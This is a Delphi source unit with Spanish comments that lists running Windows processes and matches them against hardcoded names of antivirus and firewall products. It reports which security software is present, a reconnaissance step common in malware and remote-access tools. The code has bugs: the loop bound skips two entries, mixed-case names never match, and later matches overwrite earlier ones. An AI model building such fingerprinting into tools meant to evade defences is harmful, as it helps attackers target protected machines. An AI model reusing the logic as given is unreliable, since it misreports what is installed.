//Unit para detectar Antivirus y firewalls corriendo



unit untAV;

interface

uses
  Windows,
  TLHelp32;

const
  cadenaDeProcesos  : array[0..17] of string = ('avesvc.exe',
                                             'ashdisp.exe',
                                             'avgcc.exe',
                                             'bdss.exe',
                                             'spider.exe',
                                             'avp.exe',
                                             'nod32krn.exe',
                                             'cclaw.exe',
                                             'dvpapi.exe',
                                             'ewidoctrl.exe',
                                             'mcshield.exe',
                                             'pavfires.exe',
                                             'almon.exe',
                                             'ccapp.exe',
                                             'pccntmon.exe',
                                             'fssm32.exe',
                                             'Avastsvc.exe',
                                             'AvastUI.exe');
  nombreDeAvs     : array[0..17] of string =  ('AntiVir',
                                             'Avast Antivirus',
                                             'AVG Antivirus',
                                             'BitDefender',
                                             'Dr.Web',
                                             'Kaspersky Antivirus',
                                             'Nod32',
                                             'Norman',
                                             'Authentium Antivirus',
                                             'Ewido Security Suite',
                                             'McAfee VirusScan',
                                             'Panda Antivirus/Firewall',
                                             'Sophos',
                                             'Symantec/Norton',
                                             'PC-cillin Antivirus',
                                             'F-Secure',
                                             'Avast! Free Antivirus',
                                             'Avast! Free Antivirus');
  fireProceso  : array[0..14] Of string =  ('issvc.exe',
                                             'vsmon.exe',
                                             'cpf.exe',
                                             'ca.exe',
                                             'tnbutil.exe',
                                             'avp.exe',
                                             'mpfservice.exe',
                                             'npfmsg.exe',
                                             'outpost.exe',
                                             'tpsrv.exe',
                                             'pavfires.exe',
                                             'kpf4ss.exe',
                                             'persfw.exe',
                                             'vsserv.exe',
                                             'smc.exe');
  firenombre     : array[0..14] Of string =  ('Norton Personal Firewall',
                                             'ZoneAlarm',
                                             'Comodo Firewall',
                                             'eTrust EZ Firewall',
                                             'F-Secure Internet Security',
                                             'Kaspersky Antihacker',
                                             'McAfee Personal Firewall',
                                             'Norman Personal Firewall',
                                             'Outpost Personal Firewall',
                                             'Panda Internet Seciruty Suite',
                                             'Panda Anti-Virus/Firewall',
                                             'Kerio Personal Firewall',
                                             'Tiny Personal Firewall',
                                             'BitDefender / Bull Guard Antivirus',
                                             'Sygate Personal Firewall');

function KieroElAv(): string;
function KieroElPutoFirewall(): string;
Function Scan(Tipo: integer): string;
Function LowerCase(Const S: String): String;

implementation

function KieroElAv(): string;
begin
Result := Scan(1);
if Result='' then
  begin
    result:='No Anti-Virus found';
  end;
end;

function KieroElPutoFirewall(): string;
begin
Result := Scan(2);
if result='' then
  begin
    Result:='No Firewall found';
  end;
end;

Function Scan(tipo: integer): string;
Var
  cLoop          :Boolean;
  procesos       :THandle;
  L              :TProcessEntry32;
  i              :integer;
  obfire   :string;
  obtavs :string;
Begin
obfire := '';
obtavs := '';
  procesos := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS or TH32CS_SNAPMODULE, 0);
  L.dwSize := SizeOf(L);
  cLoop := Process32First(procesos, L);
  while (Integer(cLoop) <> 0) do begin
    if tipo = 1 then begin
      for i := 0 to 15 do begin
        if LowerCase(L.szExeFile) = cadenaDeProcesos[i] then
            obtavs :=  nombreDeAvs[i] + #13#10;
      end;
    end;
    if tipo = 2 then
    begin
      for i := 0 to 14 do begin
        if LowerCase(L.szExeFile) = fireProceso[i] then
            obfire :=  firenombre[i] + #13#10;
      end;
    end;
      cLoop := Process32Next(procesos, L);
  end;
CloseHandle(procesos);
Delete(obtavs, Length(obtavs) - 1, 2);
Delete(obfire, Length(obfire) - 1, 2);
Result := obtavs +  obfire;
end;

function LowerCase(const S: string): string;//Convertir mayus y minusculas
var
  Ch     :char;
  L      :integer;
  Source :pchar;
  Dest   :pchar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest   := Pointer(Result);
  while (L <> 0) do
  begin
    Ch := Source^;
   if (Ch >= 'A') and (Ch <= 'Z') then
      Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

end.
